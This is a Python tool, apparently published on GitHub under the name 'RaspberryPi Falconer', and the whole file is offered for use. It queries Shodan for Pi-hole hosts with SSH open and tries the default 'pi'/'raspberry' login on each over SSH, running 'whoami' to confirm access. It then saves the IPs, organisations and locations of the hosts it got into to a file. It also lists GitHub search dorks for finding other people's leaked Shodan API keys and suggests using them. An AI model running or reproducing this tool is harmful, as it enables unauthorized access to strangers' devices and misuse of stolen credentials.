# -*- coding: utf-8 -*-

# Author:   Naqwada (RuptureFarm 1029) <naqwada@protonmail.com>
# License:  MIT License (http://www.opensource.org/licenses/mit-license.php)
# Docs:     https://github.com/Naqwa/RaspberryPi-Falconer
# Website:  http://samy.link/
# Linkedin: https://www.linkedin.com/in/samy-younsi/
# Note:     FOR EDUCATIONAL PURPOSE ONLY.

from __future__ import print_function, unicode_literals
from PyInquirer import Separator, Token, prompt, style_from_dict
from termcolor import cprint
from pssh.clients import ParallelSSHClient
import shodan
import random
import time
import csv
import os

def banner():
  raspberryPiFalconer = """
    ____                   __                         ____  _    
   / __ \____ __________  / /_  ___  ____________  __/ __ \(_)   
  / /_/ / __ `/ ___/ __ \/ __ \/ _ \/ ___/ ___/ / / / /_/ / /    
 / _, _/ /_/ (__  ) /_/ / /_/ /  __/ /  / /  / /_/ / ____/ /     
/_/ |_|\__,_/____/ .___/_.___/\___/_/  /_/   \__, /_/   /_/      
    ______      /_/                         /____/.~~.   .~~.             
   / ____/___ _/ /________  ____  ___  _____      '. \ ' ' /            
  / /_  / __ `/ / ___/ __ \/ __ \/ _ \/ ___/      .~ .~~~..~.             
 / __/ / /_/ / / /__/ /_/ / / / /  __/ /          : .~.'~'.~. :             
/_/    \__,_/_/\___/\____/_/ /_/\___/_/ v1.0.1   ~ (   ) (   ) ~  
                                                ( : '~'.~.'~' : )                        
Author: Naqwada, RuptureFarms 1029               ~ .~ (   ) ~. ~        
                                                  (  : '~' :  )
                      FOR EDUCATIONAL PURPOSE ONLY.'~ .~~~. ~'
                                                       '~'  
  """
  txtColors = ['red', 'yellow', 'green', 'blue', 'cyan']
  return cprint(raspberryPiFalconer, random.choice(txtColors), attrs=['bold'])

def getSavedAPIKey():
  filename = 'shodan_key.txt'
  file_exists = os.path.isfile(filename) 
  if file_exists:
    return open(filename, 'r').read()
  else:
    return open(filename, 'w+').read()

def checkShodanAPIKey(apiKey):
  try:
    print('[⏳] Checking if the Shodan API key is valid...')
    api = shodan.Shodan(apiKey)
    api.search('0_0')
    cprint('[✔️] API Key Authentication: SUCCESS..!', 'green', attrs=['bold'])
    saveAPIKey(apiKey)
    cprint('[📑] The API Key has been saved.', 'blue', attrs=['bold'])
    return apiKey
  except shodan.APIError as errorMessage:
    cprint('[🚫] Error: {}. Please, try again.'.format(errorMessage), 'red', attrs=['bold'])
    exit()

def findShoddanAPIKeyOnGit(boolean):
  if boolean == True:
    cprint('[👻] Here is a list of GitHub dorks to help you find a Shodan API Key', 'green', attrs=['bold'])
    print('[+] \033[1;32m Dork 1:\033[1;m shodan_api_key language:python')
    print('[+] \033[1;32m Dork 2:\033[1;m shodan_api_key language:php')
    print('[+] \033[1;32m Dork 3:\033[1;m shodan_api_key language:javascript')
    print('[+] \033[1;32m Dork 4:\033[1;m shodan_key language:python')
    print('[+] \033[1;32m Dork 5:\033[1;m shodan_key language:php')
    print('[+] \033[1;32m Dork 6:\033[1;m shodan_key language:javascript')
    cprint('[👀] Insert the following dorks in the GitHub search bar, select the "Code" tab, and look carefully for Shodan API keys in the code.', 'green', attrs=['bold'])
    cprint('[✏️] You can also modify the dorks by changing the language for example to get more results.', 'green', attrs=['bold'])
  print('\n[👹] See you soon for a new adventure!\n')  
  exit()

def shodanRpiGathering(apiKey):
  try:
    api = shodan.Shodan(apiKey)
    #More dorks will be added in the future
    rpiDork = '"dnsmasq-pi-hole"'
    results = []
    counter = 1
    print('\n[🤖] Start finding for Raspberry Pi Host with SSH port open on Shodan.\n')
    for response in api.search_cursor(rpiDork):
      time.sleep(2) 
      hostinfo = api.host(response['ip_str']) 
      if 22 in hostinfo['ports']:
        print('[+] \033[1;32m RPI Host found:\033[1;m {}'.format((response['ip_str'])))
        sshConnection = rpiDefaultCredential(response['ip_str'])
        if sshConnection == True:
          print('[+] \033[1;32m IP:\033[1;m {}'.format((response['ip_str'])))
          print('[+] \033[1;32m Port:\033[1;m {}'.format(str(response['port'])))
          print('[+] \033[1;32m Organization:\033[1;m {}'.format(str(response['org'])))
          print('[+] \033[1;32m Location:\033[1;m {}'.format(str(response['location'])))
          print('[+] \033[1;32m Layer:\033[1;m {}'.format((response['transport'])))
          print('[+] \033[1;32m Domains:\033[1;m {}'.format(str(response['domains'])))
          print('[+] \033[1;32m Hostnames:\033[1;m {}'.format(str(response['hostnames'])))
          cprint('[🙃] Host with default RPI credential detected.', 'green', attrs=['bold'])  
          results.append(response) 
        else:
          cprint('[🙄] Error: Authentication error while connecting to {}.'.format(response['ip_str']), 'red')
        print('[👾] \033[1;32m Result:\033[1;m {}. \033[1;32m\n'.format(str(counter)))
        counter += 1
      time.sleep(2)

      if counter >= 10000:
        break
    return results
  except shodan.APIError as errorMessage:
    cprint('[🚫] Error: {}. Please, try again.'.format(errorMessage), 'red', attrs=['bold'])

def rpiDefaultCredential(ipAddr):
    connection = ParallelSSHClient(hosts=[ipAddr], user='pi', password='raspberry',  num_retries=1, timeout=5)
    try:
        output = connection.run_command('whoami')
        return True 
    except Exception as e:
        return False

def saveResultsAs(fileFormat, results):
  savePath = 'quests/'
  filename = 'rpi-{}.{}'.format(time.strftime('%Y-%m-%d-%H:%M'), fileFormat)
  fullPath = os.path.join(savePath, filename) 
  counter = 1
  if fileFormat == 'csv':
    csvColumns = ['#', 'IP', 'Port', 'Organization', 'Location', 'Layer', 'Domains', 'Hostnames']
    try:
      with open(fullPath, 'w+') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=csvColumns)
        writer.writeheader()
        for result in results:
          writer.writerow({'#': counter, 'IP': result['ip_str'], 'Port': result['port'], 'Organization': result['org'], 'Location': result['location'], 'Layer': result['transport'], 'Domains': result['domains'], 'Hostnames': str(result['hostnames'])})
          counter += 1
    except IOError:
      print(IOError)
  else:
    try:
      file = open(fullPath, 'w+')
      counter = counter + 1
      for result in results:
        file.write('[+] IP: {}\n'.format(result['ip_str'])) 
        file.write('[+] Port: {}\n'.format(result['port']))
        file.write('[+] Organization: {}\n'.format(result['org']))
        file.write('[+] Location: {}\n'.format(result['location']))
        file.write('[+] Layer: {}\n'.format(result['transport']))
        file.write('[+] Domains {}\n'.format(result['domains']))
        file.write('[+] Hostnames: {}\n'.format(result['hostnames']))
        file.write('[+] Service information: {}\n'.format(str(result['data'])))
        file.write('\n[✓] Result: {}. Search query: {}\n'.format(str(counter), str(questName)))
        counter += 1
    except IOError:
      print("I/O error")
  return filename

def saveAPIKey(apiKey):
  filename = 'shodan_key.txt'
  file_exists = os.path.isfile(filename) 
  if file_exists:
    file = open(filename, 'w')
    file.write(apiKey) 
    file.close()
  else:
    file = open(filename, 'w+')
    file.write(apiKey) 
    file.close()
  return True

def main():
  banner()

  shodanAPIKey = getSavedAPIKey()
  results = ''
  
  if len(shodanAPIKey) == 0: 
    print('[🙂] Hi, welcome to RaspberryPi Falconer!\n')
  else:
    print('[🤠] Welcome back, ready for another hunt?!\n')

  answers = prompt(initQuestions, style=promptStyle)

  if answers.get('findNewKey') == False or answers.get('findNewKey') == True:
    findShoddanAPIKeyOnGit(answers.get('findNewKey'))

  if len(answers) and answers.get('usePreviousKey') == True: 
    shodanAPIKey = checkShodanAPIKey(shodanAPIKey)
  
  if len(answers) and answers.get('haveOwnKey') == True:
    shodanAPIKey = checkShodanAPIKey(answers.get('useNewKey'))

  if len(answers) > 0:
    results = shodanRpiGathering(shodanAPIKey)

  if len(results) > 0:
    answers = prompt(saveResultsQuestion, style=promptStyle) 
    if answers.get('fileFormat'):
      file = saveResultsAs(answers.get('fileFormat'), results)
      if len(file) > 0:
        print('[📝] Your file {} has been successfully saved!\n'.format(file))
  else:
    cprint('[😓] No vulnerable Raspbery Pi. Please try again using another dorks.', 'yellow', attrs=['bold'])   
  
  print('\n[👹] See you soon for a new adventure!\n')


initQuestions = [
    {
        'type': 'confirm',
        'name': 'usePreviousKey',
        'qmark': '[❓]',
        'message': 'Saved Shodan API key detected, do you want to use the following key: {} for your current quest?'.format(getSavedAPIKey()),
        'default': True,
        'when': lambda answer: 'The length of the API key should be at least 30 characters.' \
            if len(getSavedAPIKey()) > 30 else False
    },
   {
        'type': 'confirm',
        'name': 'haveOwnKey',
        'qmark': '[❓]',
        'message': 'Do you have a Shodan API key?',
        'default': True,
        'when': lambda answers: answers.get('usePreviousKey') == False or len(getSavedAPIKey()) < 30,
    },
    {
        'type': 'password',
        'name': 'useNewKey',
        'message': 'Enter your Shodan API key:',
        'qmark': '[🔑]',
        'when': lambda answers: answers.get('haveOwnKey') == True,
        'validate': lambda answer: 'The length of the API key should be at least 30 characters.' \
            if len(answer) < 30 else True
    },
    {
        'type': 'confirm',
        'name': 'findNewKey',
        'qmark': '[❓]',
        'message': 'You can try to find a valid API key for free using GitHub dork. Are you interested?',
        'default': False,
        'when': lambda answers: answers.get('haveOwnKey') == False,
    }
]


saveResultsQuestion = [
    {
        'type': 'confirm',
        'name': 'wantSaveResults',
        'qmark': '[❓]',
        'message': 'Do you want to save the result of your quest?',
        'default': True,
    },    
    {
        'type': 'list',
        'name': 'fileFormat',
        'qmark': '[❓]',
        'message': 'What type of format do you need?',
        'choices': ['TXT', 'CSV'],
        'filter': lambda val: val.lower(),
        'when': lambda answers: answers.get('wantSaveResults') == True,
    },
]

promptStyle = style_from_dict({
    Token.Separator: '#b41e44 bold',
    Token.QuestionMark: '#4b7bec',
    Token.Selected: '#2ecc71',
    Token.Pointer: '#45aaf2 bold',
    Token.Instruction: '', 
    Token.Answer: '#3498db bold',
    Token.Question: '#fff bold',
})

if __name__ == "__main__":
  main()